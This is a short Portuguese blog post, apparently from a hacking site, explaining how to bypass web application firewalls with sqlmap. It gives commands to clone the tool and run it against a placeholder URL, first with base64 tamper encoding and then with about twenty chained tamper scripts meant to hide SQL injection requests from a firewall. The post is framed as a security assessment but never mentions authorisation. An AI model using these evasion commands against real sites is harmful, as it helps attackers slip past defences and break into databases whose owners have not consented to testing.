---
title: Burlar WAF com SQLMAP
date: 2023-10-16 14:30:00 +0800
categories: [h4ckthreat, Hacking]
tags: [Sqlmap, Hacking] # TAG names should always be lowercase
image: /assets/img/posts/sqlmap.jpg
---

<p align="justify"> Com o avanço dos Firewalls de Aplicação da Web (Web Application Firewalls - WAFs), a tarefa de utilizar a ferramenta sqlmap tornou-se progressivamente mais desafiadora, uma vez que as requisições são rotineiramente identificadas como suspeitas e bloqueadas automaticamente. Diante dessa situação, os desenvolvedores da ferramenta têm se empenhado em criar pequenos scripts para contornar esses WAFs e permitir a execução de consultas SQL injection.</p>

<p align="justify">Vamos seguir alguns passos para utilizar o sqlmap de forma mais eficaz:</p>

## 1. Baixando o sqlmap:

```
git clone https://github.com/sqlmapproject/sqlmap
```

## 2. Execute a ferramenta para avaliar a segurança do alvo específico:

```
sqlmap.py --url="www.site.com/id.php?=1" --tamper=base64encode
```

<p align="justify"> Dessa forma, o script converterá a consulta em uma codificação base64, ajudando a superar alguns tipos de Firewalls.</p>

## 3. Quando se deparar com um Firewall mais sofisticado, será necessário empregar uma combinação de métodos de evasão:

```
sqlmap.py --url="www.site.com/id.php?=1" --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

<p align="justify"> Essa combinação de técnicas de evasão será empregada simultaneamente para ocultar as requisições e passar pelos controles do Firewall, permitindo que o "sqlmap" continue a funcionar de maneira eficaz.</p> 
